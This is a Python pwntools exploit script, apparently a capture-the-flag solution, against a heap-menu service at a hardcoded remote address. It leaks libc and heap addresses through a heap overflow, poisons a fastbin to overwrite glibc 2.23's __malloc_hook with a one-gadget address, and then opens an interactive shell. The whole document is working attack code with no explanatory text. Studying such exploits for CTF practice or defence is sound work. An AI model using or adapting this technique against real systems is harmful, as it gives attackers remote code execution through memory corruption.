#!/usr/bin/env python

from pwn import *

# r = process('./vxctf_heap', env = {'LD_PRELOAD': './libc-2.23.so'})
r = remote('35.194.219.218', 8238)

context.arch = 'amd64'

elf = ELF('./libc-2.23.so')

def add(sz, data):
    r.recvuntil('>>')
    r.sendline('1')
    r.recvuntil('>>')
    r.sendline(str(sz))
    r.recvuntil('>>')
    r.sendline(data)

def remove(idx):
    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('>>')
    r.sendline(str(idx))

def edit(idx, sz, data):
    r.recvuntil('>>')
    r.sendline('3')
    r.recvuntil('>>')
    r.sendline(str(idx))
    r.recvuntil('>>')
    r.sendline(str(sz))
    r.recvuntil('>>')
    r.sendline(data)

def view(idx):
    r.recvuntil('>>')
    r.sendline('4')
    r.recvuntil('>>')
    r.sendline(str(idx))
    r.recvuntil('Content : ')

r.recvuntil(':)')
r.sendline('9(~+V8vY=+')

add(0x200, 'aaaa') # 0
add(0x200, 'bbbb') # 1
add(0x200, 'cccc') # 2
remove(1)
edit(0, 0x210, 'a' * 0x210)
view(0)

libc = u64(r.recvline()[-7:-1].ljust(8, '\x00')) - 0x3c4b78
log.info(hex(libc))

edit(0, 0x210, 'a' * 0x200 + flat([0, 0x211]))
add(0x200, 'dddd') # 1
add(0x200, 'eeee') # 3
add(0x200, 'ffff') # 4
remove(1)
remove(3)
edit(0, 0x218, 'a' * 0x218)
view(0)

heap = u64(r.recvline()[-7:-1].ljust(8, '\x00')) - 0x12240
log.info(hex(heap))
log.info(hex(libc + elf.symbols['__malloc_hook']))

edit(0, 0x218, 'a' * 0x200 + flat([0, 0x211, libc + 0x3c4b78]))
add(0x60, 'gggg') # 1
add(0x60, 'hhhh') # 3
remove(3)
fake_chunk = libc + elf.symbols['__malloc_hook'] - 27 - 8
edit(1, 0x80, 'a' * 0x60 + flat([0, 0x71, fake_chunk, 0]))
add(0x60, 'iiii')

magic = libc + 0xf1147

add(0x60, 'a' * 19 + p64(magic))
r.recvuntil('>>')
r.sendline('1')
r.recvuntil('>>')
r.sendline('30')

r.interactive()
